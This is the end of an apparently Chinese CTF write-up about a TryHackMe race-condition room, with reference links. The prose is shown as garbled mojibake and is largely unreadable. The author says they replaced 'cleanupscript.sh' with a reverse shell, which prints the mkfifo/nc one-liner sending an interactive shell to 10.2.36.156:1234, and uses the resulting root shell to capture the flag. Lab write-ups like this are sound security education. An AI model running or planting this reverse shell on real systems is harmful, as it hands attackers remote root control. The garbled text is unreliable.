**æˆ‘åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„`cleanupscript.sh` bash è„šæœ¬ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªåå‘ shell:**

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.36.156 1234 >/tmp/f
```

**ä½¿ç”¨è¿™ä¸ªå…·æœ‰ root æƒé™çš„åå‘ shellï¼Œæˆ‘ç°åœ¨å¯ä»¥è·å¾— root æ ‡å¿—äº†ğŸ˜„ï¼**

**![](img/ce79b0b2de65a0e8241f6a95d1c57e2f.png)**

# **ç»“æŸè¯­**

**æ‰¾åˆ°æœ€åˆçš„ç«‹è¶³ç‚¹æ˜¯æŒ‘æˆ˜ä¸­æœ€å›°éš¾çš„éƒ¨åˆ†ï¼Œæˆ‘èŠ±äº†å¾ˆé•¿æ—¶é—´æ‰æ‰¾åˆ°ã€‚ç„¶è€Œï¼Œä¸€æ—¦æˆ‘ç†è§£äº†ä»€ä¹ˆæ˜¯åˆ©ç”¨ï¼Œå‰©ä¸‹çš„æŒ‘æˆ˜å°±å˜å¾—ç›¸å¯¹ç®€å•äº†ã€‚æˆ‘ä¹Ÿéå¸¸å–œæ¬¢å­¦ä¹ æ›´å¤šå…³äºç«äº‰æ¡ä»¶ä»¥åŠå¦‚ä½•åˆ©ç”¨å®ƒä»¬çš„çŸ¥è¯†ã€‚è°¢è°¢ä½ é˜…è¯»åˆ°æœ€åï¼Œå¸Œæœ›ä½ å­¦åˆ°äº†æ–°çš„ä¸œè¥¿ï¼**

# **å‚è€ƒ**

**[](https://tryhackme.com/) [## ç½‘ç»œå®‰å…¨åŸ¹è®­

### TryHackMe æ˜¯ä¸€ä¸ªå…è´¹çš„å­¦ä¹ ç½‘ç»œå®‰å…¨çš„åœ¨çº¿å¹³å°ï¼Œä½¿ç”¨åŠ¨æ‰‹ç»ƒä¹ å’Œå®éªŒå®¤ï¼Œé€šè¿‡æ‚¨çš„â€¦

tryhackme.com](https://tryhackme.com/) [](https://www.npmjs.com/package/racetrack) [## è·‘é“

### Racetrack æ˜¯ä¸€ç§ç¡®ä¿æ‰€æœ‰å¼‚æ­¥è°ƒç”¨éƒ½å·²å®Œæˆçš„æ–¹æ³•ï¼Œå¦‚æœæœ‰é—®é¢˜çš„è¯ï¼Œè¿˜å¯ä»¥æ‰¾å‡ºé—®é¢˜å‡ºåœ¨å“ªé‡Œâ€¦

www.npmjs.com](https://www.npmjs.com/package/racetrack) [](https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44) [## Node.js RCE å’Œä¸€ä¸ªç®€å•çš„åå‘ shell -CTF

### è¿™ä¸ª CTF é£æ ¼çš„æŒ‘æˆ˜çš„ç›®æ ‡æ˜¯è·å¾—å¯¹ web æœåŠ¡å™¨çš„å®Œå…¨è®¿é—®æƒï¼Œåˆ†åˆ«çªƒå–é…ç½®æ–‡ä»¶â€¦

medium.com](https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44)**